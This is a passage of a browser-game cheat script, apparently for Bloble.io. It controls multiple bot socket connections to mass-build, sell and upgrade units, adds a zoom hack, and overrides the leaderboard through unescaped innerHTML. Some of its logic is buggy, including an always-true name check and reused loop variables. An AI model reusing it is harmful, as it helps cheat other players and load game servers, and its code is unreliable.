for(var i=0;i<users.length;i++){
for(var allUnits=0;allUnits<selUnits.length;allUnits++){
if(users[i].sid==selUnits[allUnits].owner && users[i].sid!==player.sid){if(users[i].x==null){users[i].x=0}if(users[i].y==null){users[i].y=0}X.push(users[i].x);Y.push(users[i].y);}}};
for (var e = [], b = 0; b < Math.floor(selUnits.length-0); ++b)for(var B=0;B<window.sockets.length;B++){ e.push(selUnits[b].id);sockets[B].emit("5", (X)-1, (Y)+1, e, 0, -1);}
for (var e = [], b = 0; b < Math.floor(selUnits.length-0); ++b)for(var B=0;B<window.sockets.length;B++){ e.push(selUnits[b].id);sockets[B].emit("5", (X)+1, (Y)-1, e, 0, -1);}
for (var e = [], b = 0; b < Math.floor(selUnits.length-0); ++b)for(var B=0;B<window.sockets.length;B++){ e.push(selUnits[b].id);sockets[B].emit("5", (X)*1, (Y)*1, e, 0, -1);}
for (var e = [], b = 0; b < Math.floor(selUnits.length-0); ++b)for(var B=0;B<window.sockets.length;B++){ e.push(selUnits[b].id);sockets[B].emit("5", (X), (Y), e, 0, -1);}
if (unitsWithTag() !== 0) {
for (var i = lastUnit, e = units, h = e.length * 2; i < h; ++i) {if (i == h) {break;}if (i == e.length) {i = 0;}if (units[i] !== undefined) {var o = users[getUserBySID(units[i].owner)];if (o !== undefined && o.sid !== player.sid && o.name.startsWith(player.name) && e[i].shape == "circle" && e[i].uPath==11) {selUnits = [];camX = units[i].x - player.x;camY = units[i].y - player.y;
selUnits.push(units[i]);
if (i == e.length) { lastUnit = 0; }
else { lastUnit = 1 + i; }
break;
}}}}};

//===================Fim===================//

//===================Select gens===================//
function SelectGens(){
var nome=[];
for(var i=0;i<users.length;i++){
for(var allUnits=0;allUnits<selUnits.length;allUnits++){
if(users[i].sid==selUnits[allUnits].owner && users[i].sid!==player.sid){
nome.push(users[i].sid);
var test = users[i].sid;
console.log(test);
selUnits = [];
units.forEach((unit) => {
if (unit.owner === test && unit.type === 0) {
if (!unit.info) unit.info = getUnitFromPath(unit.uPath);
if(unit.info.name === 'Generator' || 'Power Plant' && unit.info.name !== 'Armory'){
selUnits.push(unit);
return false;}}
return true;});
selUnitType = "Unit";
}}}}
//===================Fim===================//

//===================Vender as coisas===================//
function Sell(){
if (selUnits.length) {
for (var a = [], d = 0; d < selUnits.length; ++d)
a.push(selUnits[d].id);
for(var i=0; i<window.sockets.length; i++){sockets[i].emit("3", a);}
}}
//===================Fim===================//

//===================Select Wall===================//
function Selectwall(){
var nome=[];
for(var i=0;i<users.length;i++){
for(var allUnits=0;allUnits<selUnits.length;allUnits++){
if(users[i].sid==selUnits[allUnits].owner && users[i].sid!==player.sid){
nome.push(users[i].sid);
var test = users[i].sid;
console.log(test);
selUnits = [];
units.forEach((unit) => {
if (unit.owner === test && unit.type === 3) {
if (!unit.info) unit.info = getUnitFromPath(unit.uPath);
if(unit.info.name === 'Wall'){
selUnits.push(unit);
return false;}}
return true;});
selUnitType = "Unit";
}}}}
//===================Fim===================//

//===================Power Plant=============//
function power(){
var nome=[];
for(var i=0;i<users.length;i++){
for(var allUnits=0;allUnits<selUnits.length;allUnits++){
if(users[i].sid==selUnits[allUnits].owner && users[i].sid!==player.sid){
nome.push(users[i].name);
var test = users[i].name;
var num2 = test.replace(/[^0-9]/g,'');
for (var i = 0; i < units.length; ++i) {if (units[i].type === 0 && "hexagon" == units[i].shape) {sockets[num2].emit("4", units[i].id, 0)}}
    var nome=[];
for(var i=0;i<users.length;i++){
for(var allUnits=0;allUnits<selUnits.length;allUnits++){
if(users[i].sid==selUnits[allUnits].owner && users[i].sid!==player.sid){
nome.push(users[i].name);
var test = users[i].name;
var num2 = test.replace(/[^0-9]/g,'');
for (var i = 0; i < units.length; ++i) {if (units[i].type === 3 && "circle" == units[i].shape) {sockets[num2].emit("4", units[i].id, 1)}}}}}}
}}};

//===================Fim===================//

//===================Função===================//
function SellwallBots() { setTimeout(function() { Selectwall(); }, 10); setTimeout(function() { Sell(); }, 20); setTimeout(function() { BuildBots2(); }, 30); setTimeout(function() { MicroBot(); }, 40); setTimeout(function() { Barraca(); }, 100) }
function SellwallBots2() { setTimeout(function() { Selectwall(); }, 10); setTimeout(function() { Sell(); }, 20); setTimeout(function() { BuildBots3(); }, 30); setTimeout(function() { MicroBot1(); }, 40); setTimeout(function() { power(); }, 50); setTimeout(function() { Barraca(); }, 200) }
function SellGensBots(){setTimeout(function(){SelectGens();},10);setTimeout(function(){Sell();},1000)}
function SellHouseBots(){setTimeout(function(){SelectHouse();},10);setTimeout(function(){Sell();},1000)}
function SellObjBot(){if (selUnits.length !== 0) {window.sockets.forEach(socket => {socket.emit('del', selUnits[0].owner);})}}
function OlharBots(){if (usersWithTag() !== 0) {for (var i = lastAlly, e = users, h = e.length * 2; i < h; ++i) {if (i == e.length) {i = 0}if (i !== 0 && users[i].sid !== player.sid && users[i].name.startsWith(player.name)) {camX = users[i].x - player.x;camY = users[i].y - player.y;if (i == e.length) { lastAlly = 0; } else { lastAlly = 1 + i; }break}}}}
function CommanderBots(){for (var i = 0; i < window.sockets.length; i++){sockets[i].emit("4", 0, 0, 1)}}
function sendChatMessage(str) {if (!window.sockets) return alert("no sockets");window.sockets.forEach(socket => {socket.emit("ch", str)})}
function maiszoom(){(maxScreenHeight = 102000, maxScreenWidth = 5200, resize(true))}
function menoszoom(){(maxScreenHeight = 1080, maxScreenWidth = 1920, resize(true))}
function juntar1(){var a = player.x + targetDst * MathCOS(targetDir) + camX,d = player.y + targetDst * MathSIN(targetDir) + camY;for (var e = [], b = 0; b < selUnits.length; ++b) e.push(selUnits[b].id);window.sockets.forEach(socket => {socket.emit("5", UTILS.roundToTwo(a), UTILS.roundToTwo(d), e, 0, -1)});socket.emit("5", UTILS.roundToTwo(a), UTILS.roundToTwo(d), e, 0, -1)}
function juntar2(){var c = player.x + targetDst * MathCOS(targetDir) + camX,d = player.y + targetDst * MathSIN(targetDir) + camY;for (var e = [], b = 0; b < selUnits.length; ++b) e.push(selUnits[b].id);window.sockets.forEach(socket => {socket.emit("5", c*1, d*1, e, 0, -1)});socket.emit("5", c*1, d*1, e, 0, -1)}

//===================Fim===================//

//===================Build base nova===================//
function basenova(){
var nome=[];
for(var i=0;i<users.length;i++){
for(var allUnits=0;allUnits<selUnits.length;allUnits++){
if(users[i].sid==selUnits[allUnits].owner && users[i].sid!==player.sid){
nome.push(users[i].name);
var test = users[i].name;
var num2 = test.replace(/[^0-9]/g,'');
sockets[num2].emit("1", 11.72, 306, 1); sockets[num2].emit("1", 11.93, 310, 1); sockets[num2].emit("1", 11.51, 306, 1); sockets[num2].emit("1", 10.49, 306, 1); sockets[num2].emit("1", 10.07, 310, 1); sockets[num2].emit("1", 8.26, 306, 1); sockets[num2].emit("1", 8.46, 306, 1); sockets[num2].emit("1", 8.66, 306, 1); sockets[num2].emit("1", 8.86, 306, 1); sockets[num2].emit("1", 9.06, 306, 1); sockets[num2].emit("1", 9.26, 306, 1); sockets[num2].emit("1", 9.46, 306, 1); sockets[num2].emit("1", 9.66, 306, 1); sockets[num2].emit("1", 9.86, 306, 1); sockets[num2].emit("1", 10.28, 306, 1); sockets[num2].emit("1", 10.7, 306, 1); sockets[num2].emit("1", 10.9, 306, 1); sockets[num2].emit("1", 11.1, 306, 1); sockets[num2].emit("1", 11.3, 306, 1); sockets[num2].emit("1", 12.14, 305.99, 1); sockets[num2].emit("1", 12.34, 306, 1); sockets[num2].emit("1", 12.54, 306, 1); sockets[num2].emit("1", 12.74, 306, 1); sockets[num2].emit("1", 12.94, 306, 1); sockets[num2].emit("1", 13.14, 306, 1); sockets[num2].emit("1", 13.34, 306, 1); sockets[num2].emit("1", 13.54, 306, 1); sockets[num2].emit("1", 13.74, 306, 1); sockets[num2].emit("1", 13.94, 306, 1); sockets[num2].emit("1", 8.06, 306, 1); sockets[num2].emit("1", 7.86, 306, 1); sockets[num2].emit("1", 4.73, 243.85, 1); sockets[num2].emit("1", 5, 243.85, 1); sockets[num2].emit("1", 5.28, 243.85, 1); sockets[num2].emit("1", 5.55, 243.85, 1); sockets[num2].emit("1", 5.82, 243.85, 1); sockets[num2].emit("1", 6.09, 243.85, 1); sockets[num2].emit("1", 6.37, 243.85, 1); sockets[num2].emit("1", 6.64, 243.85, 1); sockets[num2].emit("1", 6.91, 243.84, 1); sockets[num2].emit("1", 7.18, 243.85, 1); sockets[num2].emit("1", 7.46, 243.85, 1); sockets[num2].emit("1", 7.73, 243.85, 1); sockets[num2].emit("1", 8, 243.85, 1); sockets[num2].emit("1", 8.28, 243.85, 1); sockets[num2].emit("1", 8.55, 243.85, 1); sockets[num2].emit("1", 8.82, 243.85, 1); sockets[num2].emit("1", 9.09, 243.85, 1); sockets[num2].emit("1", 9.37, 243.85, 1); sockets[num2].emit("1", 9.64, 243.85, 1); sockets[num2].emit("1", 9.91, 243.85, 1); sockets[num2].emit("1", 10.19, 243.84, 1); sockets[num2].emit("1", 10.46, 243.86, 1); sockets[num2].emit("1", 10.74, 243.85, 1); sockets[num2].emit("1", 6.28, 132, 1); sockets[num2].emit("1", 6.78, 132, 1); sockets[num2].emit("1", 7.3, 132, 1); sockets[num2].emit("1", 7.85, 132, 1); sockets[num2].emit("1", 8.4, 132, 1); sockets[num2].emit("1", 8.93, 132, 1); sockets[num2].emit("1", 9.5, 132, 1); sockets[num2].emit("1", 10.05, 132, 1); sockets[num2].emit("1", 10.6, 132, 1); sockets[num2].emit("1", 4.81, 132, 1); sockets[num2].emit("1", 5.36, 132, 1); sockets[num2].emit("1", -1.7, 185.55, 1); sockets[num2].emit("1", -2.24, 185.14, 1); sockets[num2].emit("1", -2.8, 181.72, 1); sockets[num2].emit("1", 2.92, 181.19, 1); sockets[num2].emit("1", 2.4, 186.49, 1); sockets[num2].emit("1", 1.85, 184.66, 1); sockets[num2].emit("1", 1.29, 185.73, 1); sockets[num2].emit("1", 0.74, 184.92, 1); sockets[num2].emit("1", 0.21, 186.65, 1); sockets[num2].emit("1", -0.29, 184.6, 1); sockets[num2].emit("1", -0.63, 183.85, 1); sockets[num2].emit("1", -1.18, 184.61, 1)
}}}};
//===================Fim===================//

//===================Defesa base nova===================//
function BuildBots3(){
var nome=[];
for(var i=0;i<users.length;i++){
for(var allUnits=0;allUnits<selUnits.length;allUnits++){
if(users[i].sid==selUnits[allUnits].owner && users[i].sid!==player.sid){
nome.push(users[i].name);
var test = users[i].name;
var num2 = test.replace(/[^0-9]/g,'');
sockets[num2].emit("1",4.73, 243.85, 3); sockets[num2].emit("1",5, 243.85, 3); sockets[num2].emit("1",5.28, 243.85, 3); sockets[num2].emit("1",5.55, 243.85, 3); sockets[num2].emit("1",5.82, 243.85, 3); sockets[num2].emit("1",6.09, 243.85, 3); sockets[num2].emit("1",6.37, 243.85, 3); sockets[num2].emit("1",6.64, 243.85, 3); sockets[num2].emit("1",6.91, 243.84, 3); sockets[num2].emit("1",7.18, 243.85, 3); sockets[num2].emit("1",7.46, 243.85, 3); sockets[num2].emit("1",7.73, 243.85, 3); sockets[num2].emit("1",8, 243.85, 3); sockets[num2].emit("1",8.28, 243.85, 3); sockets[num2].emit("1",8.55, 243.85, 3); sockets[num2].emit("1",8.82, 243.85, 3); sockets[num2].emit("1",9.09, 243.85, 3); sockets[num2].emit("1",9.37, 243.85, 3); sockets[num2].emit("1",9.64, 243.85, 3); sockets[num2].emit("1",9.91, 243.85, 3); sockets[num2].emit("1",10.19, 243.84, 3); sockets[num2].emit("1",10.46, 243.86, 3); sockets[num2].emit("1",10.74, 243.85, 3); sockets[num2].emit("1",6.28, 132, 3); sockets[num2].emit("1",6.78, 132, 3); sockets[num2].emit("1",7.86, 306, 1); sockets[num2].emit("1",7.3, 132, 3); sockets[num2].emit("1",7.85, 132, 3); sockets[num2].emit("1",8.4, 132, 3); sockets[num2].emit("1",8.93, 132, 3); sockets[num2].emit("1",9.5, 132, 3); sockets[num2].emit("1",10.05, 132, 3); sockets[num2].emit("1",8.06, 306, 1); sockets[num2].emit("1",10.6, 132, 3); sockets[num2].emit("1",4.81, 132, 3); sockets[num2].emit("1",5.36, 132, 3); sockets[num2].emit("1",8.26, 306, 1); sockets[num2].emit("1",8.46, 306, 1); sockets[num2].emit("1",8.66, 306, 1); sockets[num2].emit("1",8.86, 306, 1); sockets[num2].emit("1",9.06, 306, 1); sockets[num2].emit("1",9.26, 306, 1); sockets[num2].emit("1",9.46, 306, 1); sockets[num2].emit("1",9.66, 306, 1); sockets[num2].emit("1",9.86, 306, 1); sockets[num2].emit("1",10.28, 306, 1); sockets[num2].emit("1",10.7, 306, 1); sockets[num2].emit("1",10.9, 306, 1); sockets[num2].emit("1",11.1, 306, 1); sockets[num2].emit("1",11.3, 306, 1); sockets[num2].emit("1",12.14, 305.99, 1); sockets[num2].emit("1",12.34, 306, 1); sockets[num2].emit("1",12.54, 306, 1); sockets[num2].emit("1",12.74, 306, 1); sockets[num2].emit("1",12.94, 306, 1); sockets[num2].emit("1",13.14, 306, 1); sockets[num2].emit("1",13.34, 306, 1); sockets[num2].emit("1",13.54, 306, 1); sockets[num2].emit("1",13.74, 306, 1); sockets[num2].emit("1",13.94, 306, 1); sockets[num2].emit("1",-1.7, 185.55, 4); sockets[num2].emit("1",10.07, 310, 8); sockets[num2].emit("1",10.49, 306, 1); sockets[num2].emit("1",-2.24, 185.14, 4); sockets[num2].emit("1",-2.8, 181.72, 4); sockets[num2].emit("1",2.92, 181.19, 4); sockets[num2].emit("1",2.4, 186.49, 4); sockets[num2].emit("1",1.85, 184.66, 4); sockets[num2].emit("1",1.29, 185.73, 4); sockets[num2].emit("1",0.74, 184.92, 4); sockets[num2].emit("1",0.21, 186.65, 4); sockets[num2].emit("1",-0.29, 184.6, 4); sockets[num2].emit("1",-0.63, 183.85, 4); sockets[num2].emit("1",-1.18, 184.61, 4); sockets[num2].emit("1",11.72, 306, 1); sockets[num2].emit("1",11.93, 310, 8); sockets[num2].emit("1",11.51, 306, 1);
}}}};
//===================Fim===================//

//===================Build atk===================//
function BuildBots1(){
var nome=[];
for(var i=0;i<users.length;i++){
for(var allUnits=0;allUnits<selUnits.length;allUnits++){
if(users[i].sid==selUnits[allUnits].owner && users[i].sid!==player.sid){
nome.push(users[i].name);
var test = users[i].name;
var num2 = test.replace(/[^0-9]/g,'');
sockets[num2].emit("1",4.725,130,7),sockets[num2].emit("1",5.245,130,4), sockets[num2].emit("1",5.715,130,4), sockets[num2].emit("1",6.185,130,4), sockets[num2].emit("1",6.655,130,4), sockets[num2].emit("1",7.13,130,4), sockets[num2].emit("1",7.6,130,4), sockets[num2].emit("1",1.85,130,4), sockets[num2].emit("1",2.32,130,4), sockets[num2].emit("1",2.79,130,4), sockets[num2].emit("1",3.265,130,4), sockets[num2].emit("1",3.735,130,4), sockets[num2].emit("1",4.205,130,4), sockets[num2].emit("1",5.06,185,4), sockets[num2].emit("1",5.4,185,4), sockets[num2].emit("1",5.725,190,4), sockets[num2].emit("1",6.045,186,4), sockets[num2].emit("1",6.374,185,4), sockets[num2].emit("1",6.7215,189.5,4), sockets[num2].emit("1",7.0425,188.5,4), sockets[num2].emit("1",7.365,185,4), sockets[num2].emit("1",7.712,187.45,4), sockets[num2].emit("1",8.035,188.5,4), sockets[num2].emit("1",8.36,185,4), sockets[num2].emit("1",2.425,188,4), sockets[num2].emit("1",2.75,190,4), sockets[num2].emit("1",3.075,184,4), sockets[num2].emit("1",3.42,186,4), sockets[num2].emit("1",3.74,190,4), sockets[num2].emit("1",4.06,186,4), sockets[num2].emit("1",4.39,185,4), sockets[num2].emit("1",4.8625,245,4), sockets[num2].emit("1",5.1125,245,4), sockets[num2].emit("1",5.3625,245,4), sockets[num2].emit("1",5.6125,245,4), sockets[num2].emit("1",5.8625,245,4), sockets[num2].emit("1",6.1125,245,4), sockets[num2].emit("1",6.3625,245,4), sockets[num2].emit("1",6.6125,245,4), sockets[num2].emit("1",6.8625,245,4), sockets[num2].emit("1",7.14,245,4), sockets[num2].emit("1",7.39,245,4), sockets[num2].emit("1",7.64,246,4), sockets[num2].emit("1",7.89,246,4), sockets[num2].emit("1",8.14,246,4), sockets[num2].emit("1",8.39,246,4), sockets[num2].emit("1",8.635,246,4), sockets[num2].emit("1",8.885,246,4), sockets[num2].emit("1",2.5825,245,4), sockets[num2].emit("1",2.8625,245,4), sockets[num2].emit("1",3.1125,245,4), sockets[num2].emit("1",3.3625,245,4), sockets[num2].emit("1",3.6125,245,4), sockets[num2].emit("1",3.8625,245,4), sockets[num2].emit("1",4.1125,245,4), sockets[num2].emit("1",4.3625,245,4), sockets[num2].emit("1",4.6125,245,4), sockets[num2].emit("1",7.86,311,1), sockets[num2].emit("1",8.06,311,1), sockets[num2].emit("1",8.26,311,1), sockets[num2].emit("1",8.46,311,1), sockets[num2].emit("1",8.66,311,1), sockets[num2].emit("1",8.86,311,1), sockets[num2].emit("1",9.06,311,1), sockets[num2].emit("1",9.26,311,1), sockets[num2].emit("1",9.46,311,1), sockets[num2].emit("1",9.66,311,1), sockets[num2].emit("1",9.86,311,1), sockets[num2].emit("1",10.28,311,1), sockets[num2].emit("1",10.70,311,1), sockets[num2].emit("1",10.90,311,1), sockets[num2].emit("1",11.10,311,1), sockets[num2].emit("1",11.30,311,1), sockets[num2].emit("1",11.72,311,1), sockets[num2].emit("1",12.14,311,1), sockets[num2].emit("1",12.34,311,1), sockets[num2].emit("1",12.54,311,1), sockets[num2].emit("1",12.74,311,1), sockets[num2].emit("1",12.94,311,1), sockets[num2].emit("1",13.14,311,1), sockets[num2].emit("1",13.34,311,1), sockets[num2].emit("1",13.54,311,1), sockets[num2].emit("1",13.74,311,1), sockets[num2].emit("1",13.94,311,1),sockets[num2].emit("1",10.07,311,8), sockets[num2].emit("1",10.49,311,8), sockets[num2].emit("1",11.51,311,8), sockets[num2].emit("1",11.93,311,8);
}}};}
//===================Fim===================//
//===================Build atk===================//
function BuildBots2(){
var nome=[];
for(var i=0;i<users.length;i++){
for(var allUnits=0;allUnits<selUnits.length;allUnits++){
if(users[i].sid==selUnits[allUnits].owner && users[i].sid!==player.sid){
nome.push(users[i].name);
var test = users[i].name;
var num2 = test.replace(/[^0-9]/g,'');
sockets[num2].emit("1",4.725,130,7),sockets[num2].emit("1",5.245,130,4), sockets[num2].emit("1",5.715,130,4), sockets[num2].emit("1",6.185,130,4), sockets[num2].emit("1",6.655,130,4), sockets[num2].emit("1",7.13,130,4), sockets[num2].emit("1",7.6,130,4), sockets[num2].emit("1",1.85,130,4), sockets[num2].emit("1",2.32,130,4), sockets[num2].emit("1",2.79,130,4), sockets[num2].emit("1",3.265,130,4), sockets[num2].emit("1",3.735,130,4), sockets[num2].emit("1",4.205,130,4), sockets[num2].emit("1",5.06,185,4), sockets[num2].emit("1",5.4,185,4), sockets[num2].emit("1",5.725,190,4), sockets[num2].emit("1",6.045,186,4), sockets[num2].emit("1",6.374,185,4), sockets[num2].emit("1",6.7215,189.5,4), sockets[num2].emit("1",7.0425,188.5,4), sockets[num2].emit("1",7.365,185,4), sockets[num2].emit("1",7.712,187.45,4), sockets[num2].emit("1",8.035,188.5,4), sockets[num2].emit("1",8.36,185,4), sockets[num2].emit("1",2.425,188,4), sockets[num2].emit("1",2.75,190,4), sockets[num2].emit("1",3.075,184,4), sockets[num2].emit("1",3.42,186,4), sockets[num2].emit("1",3.74,190,4), sockets[num2].emit("1",4.06,186,4), sockets[num2].emit("1",4.39,185,4), sockets[num2].emit("1",4.8625,245,4), sockets[num2].emit("1",5.1125,245,4), sockets[num2].emit("1",5.3625,245,4), sockets[num2].emit("1",5.6125,245,4), sockets[num2].emit("1",5.8625,245,4), sockets[num2].emit("1",6.1125,245,4), sockets[num2].emit("1",6.3625,245,4), sockets[num2].emit("1",6.6125,245,4), sockets[num2].emit("1",6.8625,245,4), sockets[num2].emit("1",7.14,245,4), sockets[num2].emit("1",7.39,245,4), sockets[num2].emit("1",7.64,246,4), sockets[num2].emit("1",7.89,246,4), sockets[num2].emit("1",8.14,246,4), sockets[num2].emit("1",8.39,246,4), sockets[num2].emit("1",8.635,246,4), sockets[num2].emit("1",8.885,246,4), sockets[num2].emit("1",2.5825,245,4), sockets[num2].emit("1",2.8625,245,4), sockets[num2].emit("1",3.1125,245,4), sockets[num2].emit("1",3.3625,245,4), sockets[num2].emit("1",3.6125,245,4), sockets[num2].emit("1",3.8625,245,4), sockets[num2].emit("1",4.1125,245,4), sockets[num2].emit("1",4.3625,245,4), sockets[num2].emit("1",4.6125,245,4), sockets[num2].emit("1",7.86,311,1), sockets[num2].emit("1",8.06,311,1), sockets[num2].emit("1",8.26,311,1), sockets[num2].emit("1",8.46,311,1), sockets[num2].emit("1",8.66,311,1), sockets[num2].emit("1",8.86,311,1), sockets[num2].emit("1",9.06,311,1), sockets[num2].emit("1",9.26,311,1), sockets[num2].emit("1",9.46,311,1), sockets[num2].emit("1",9.66,311,1), sockets[num2].emit("1",9.86,311,1), sockets[num2].emit("1",10.28,311,1), sockets[num2].emit("1",10.70,311,1), sockets[num2].emit("1",10.90,311,1), sockets[num2].emit("1",11.10,311,1), sockets[num2].emit("1",11.30,311,1), sockets[num2].emit("1",11.72,311,1), sockets[num2].emit("1",12.14,311,1), sockets[num2].emit("1",12.34,311,1), sockets[num2].emit("1",12.54,311,1), sockets[num2].emit("1",12.74,311,1), sockets[num2].emit("1",12.94,311,1), sockets[num2].emit("1",13.14,311,1), sockets[num2].emit("1",13.34,311,1), sockets[num2].emit("1",13.54,311,1), sockets[num2].emit("1",13.74,311,1), sockets[num2].emit("1",13.94,311,1)
}}};}
//===================Fim===================//

//==================Remontar barraca=============//
function Barraca(){
var nome=[];
for(var i=0;i<users.length;i++){
for(var allUnits=0;allUnits<selUnits.length;allUnits++){
if(users[i].sid==selUnits[allUnits].owner && users[i].sid!==player.sid){
nome.push(users[i].name);
var test = users[i].name;
var num2 = test.replace(/[^0-9]/g,'');
sockets[num2].emit("1",10.07,311,8), sockets[num2].emit("1",10.49,311,8), sockets[num2].emit("1",11.51,311,8), sockets[num2].emit("1",11.93,311,8);
}}};}

//===================Defend Bots===================//
function DefendBots(){
var nome=[];
for(var i=0;i<users.length;i++){
for(var allUnits=0;allUnits<selUnits.length;allUnits++){
if(users[i].sid==selUnits[allUnits].owner && users[i].sid!==player.sid){
nome.push(users[i].name);
var test = users[i].name;
var num2 = test.replace(/[^0-9]/g,'');
sockets[num2].emit("1", 7.86, 311, 1), sockets[num2].emit("1", 8.06, 311, 1), sockets[num2].emit("1", 8.26, 311, 1), sockets[num2].emit("1", 8.46, 311, 1), sockets[num2].emit("1", 8.66, 311, 1), sockets[num2].emit("1", 8.86, 311, 1), sockets[num2].emit("1", 9.06, 311, 1), sockets[num2].emit("1", 9.26, 311, 1), sockets[num2].emit("1", 9.46, 311, 1), sockets[num2].emit("1", 9.66, 311, 1), sockets[num2].emit("1", 9.86, 311, 1), sockets[num2].emit("1", 10.28, 311, 1), sockets[num2].emit("1", 10.70, 311, 1), sockets[num2].emit("1", 10.90, 311, 1), sockets[num2].emit("1", 11.10, 311, 1), sockets[num2].emit("1", 11.30, 311, 1), sockets[num2].emit("1", 11.72, 311, 1), sockets[num2].emit("1", 12.14, 311, 1), sockets[num2].emit("1", 12.34, 311, 1), sockets[num2].emit("1", 12.54, 311, 1), sockets[num2].emit("1", 12.74, 311, 1), sockets[num2].emit("1", 12.94, 311, 1), sockets[num2].emit("1", 13.14, 311, 1), sockets[num2].emit("1", 13.34, 311, 1), sockets[num2].emit("1", 13.54, 311, 1), sockets[num2].emit("1", 13.74, 311, 1), sockets[num2].emit("1", 13.94, 311, 1), sockets[num2].emit("1", 10.07, 311, 1), sockets[num2].emit("1", 10.49, 311, 1), sockets[num2].emit("1", 11.51, 311, 1), sockets[num2].emit("1", 11.93, 311, 1), sockets[num2].emit("1", 4.8625, 245, 1), sockets[num2].emit("1", 5.1125, 245, 1), sockets[num2].emit("1", 5.3625, 245, 1), sockets[num2].emit("1", 5.6125, 245, 1), sockets[num2].emit("1", 5.8625, 245, 1), sockets[num2].emit("1", 6.1125, 245, 1), sockets[num2].emit("1", 6.3625, 245, 1), sockets[num2].emit("1", 6.6125, 245, 1), sockets[num2].emit("1", 6.8625, 245, 1), sockets[num2].emit("1", 7.14, 245, 1), sockets[num2].emit("1", 7.39, 245, 1), sockets[num2].emit("1", 7.64, 246, 1), sockets[num2].emit("1", 7.89, 246, 1), sockets[num2].emit("1", 8.14, 246, 1), sockets[num2].emit("1", 8.39, 246, 1), sockets[num2].emit("1", 8.635, 246, 1), sockets[num2].emit("1", 8.885, 246, 1), sockets[num2].emit("1", 2.5825, 245, 1), sockets[num2].emit("1", 2.8625, 245, 1), sockets[num2].emit("1", 3.1125, 245, 1), sockets[num2].emit("1", 3.3625, 245, 1), sockets[num2].emit("1", 3.6125, 245, 1), sockets[num2].emit("1", 3.8625, 245, 1), sockets[num2].emit("1", 4.1125, 245, 1), sockets[num2].emit("1", 4.3625, 245, 1), sockets[num2].emit("1", 4.6125, 245, 1), sockets[num2].emit("1", 4.726, 190, 1), sockets[num2].emit("1", 5.725, 190, 1), sockets[num2].emit("1", 2.75, 190, 1), sockets[num2].emit("1", 3.74, 190, 1), sockets[num2].emit("1", 5.725, 190, 1), sockets[num2].emit("1", 2.75, 190, 1), sockets[num2].emit("1", 6.7215, 189.5, 1), sockets[num2].emit("1", 5.06, 185, 1), sockets[num2].emit("1", 5.4, 185, 1), sockets[num2].emit("1", 6.045, 186, 1), sockets[num2].emit("1", 6.374, 185, 1), sockets[num2].emit("1", 5.4, 185, 1), sockets[num2].emit("1", 7.0425, 188.5, 1), sockets[num2].emit("1", 7.365, 185, 1), sockets[num2].emit("1", 7.712, 187.45, 1), sockets[num2].emit("1", 8.035, 188.5, 1), sockets[num2].emit("1", 8.36, 185, 1), sockets[num2].emit("1", 2.425, 188, 1), sockets[num2].emit("1", 3.075, 184, 1), sockets[num2].emit("1", 5.06, 185, 1), sockets[num2].emit("1", 3.42, 186, 1), sockets[num2].emit("1", 3.74, 190, 1), sockets[num2].emit("1", 4.06, 186, 1), sockets[num2].emit("1", 4.39, 185, 1), sockets[num2].emit("1", 4.725, 130, 1), sockets[num2].emit("1", 5.245, 130, 1), sockets[num2].emit("1", 5.715, 130, 1), sockets[num2].emit("1", 6.185, 130, 1), sockets[num2].emit("1", 6.655, 130, 1), sockets[num2].emit("1", 7.13, 130, 1), sockets[num2].emit("1", 7.6, 130, 1), sockets[num2].emit("1", 1.85, 130, 1), sockets[num2].emit("1", 2.32, 130, 1), sockets[num2].emit("1", 2.79, 130, 1), sockets[num2].emit("1", 3.265, 130, 1), sockets[num2].emit("1", 3.735, 130, 1), sockets[num2].emit("1", 4.205, 130, 1);
}}};
}
//===================Fim===================//

//===================Up Micro===================//
function MicroBot(){
var nome=[];
for(var i=0;i<users.length;i++){
for(var allUnits=0;allUnits<selUnits.length;allUnits++){
if(users[i].sid==selUnits[allUnits].owner && users[i].sid!==player.sid){
nome.push(users[i].name);
var test = users[i].name;
var num2 = test.replace(/[^0-9]/g,'');
for (var i = 0; i < units.length; ++i) {if (units[i].type === 3 && "circle" == units[i].shape) {sockets[num2].emit("4", units[i].id, 1)}}
}}};}
//===================Fim===================///

//===================Up Ant tank===================
function AntitankBot(){
var nome=[];
for(var i=0;i<users.length;i++){
for(var allUnits=0;allUnits<selUnits.length;allUnits++){
if(users[i].sid==selUnits[allUnits].owner && users[i].sid!==player.sid){
nome.push(users[i].name);
var test = users[i].name;
var num2 = test.replace(/[^0-9]/g,'');
for (var i = 0; i < units.length; ++i) 0 == units[i].type && 4 == units[i].turretIndex && "circle" == units[i].shape && sockets[num2].emit("4", units[i].id, 1)
}}};}
function unitsWithTag() {
if (units.length) {
for (var o = [], i = 0, e = units; i < e.length; ++i) {
var h = users[getUserBySID(e[i].owner)];
if (h !== undefined && e[i].shape == "circle" && e[i].uPath == 11 && h.name.startsWith(player.name)) {
o.push(e[i]);}}return o.length;}else {return 0;}}var lastUnit = 0;

//===================Teclas===================//
addEventListener('keydown',function(a){
if(a.keyCode==110){Centralizar()}
if(a.keyCode==90){BuildBots1()}
if(a.keyCode==88){DefendBots()}
if(a.keyCode==46){SellObjBot()}
if(a.keyCode==49){SellGensBots()}
if(a.keyCode==50){MicroBot()}
if(a.keyCode==51){AntitankBot()}
if(a.keyCode==52){SellwallBots()}
if(a.keyCode==97){basenova()}
if(a.keyCode==98){SellwallBots2()}
if(a.keyCode==192){OlharBots()}
if(a.keyCode==67){CommanderBots()}
if(a.keyCode==107){maiszoom()}
if(a.keyCode==109){menoszoom()}
if(a.keyCode==16){juntar1();juntar2()}
})

//===================Fim===================//

//===================InstaFind===================//
var gotoUsers = [];var gotoIndex = 0;
window.overrideSocketEvents = window.overrideSocketEvents || [];
window.chatCommands = window.chatCommands || {};
window.overrideSocketEvents.push({name: "l",description: "Leaderboard Insta Find override",func: function(a) {var d = "",c = 1,b = 0;for (; b < a.length;) {d += "<div class='leaderboardItem' onclick=goto2(" + a[b] + ");><div style='display:inline-block;float:left;' class='whiteText'>" + c + ".</div> <div class='" + (player && a[b] == player.sid ? "leaderYou" : "leader") + "'>" + a[b + 1] + "</div><div class='scoreText'>" + a[b + 2] + "</div></div>", c++, b += 3;}leaderboardList.innerHTML = d;}});leaderboardList.style.pointerEvents = 'auto';chatListWrapper.style.pointerEvents = 'auto';
window.goto = function(username) {gotoUsers = users.filter((user) => {return user.name === username});gotoIndex = 0;if (gotoUsers[0]) {camX = gotoUsers[0].x - player.x;camY = gotoUsers[0].y - player.y;}addChat(gotoUsers.length + ' users found with the name ' + username, 'Client');return gotoUsers.length;}
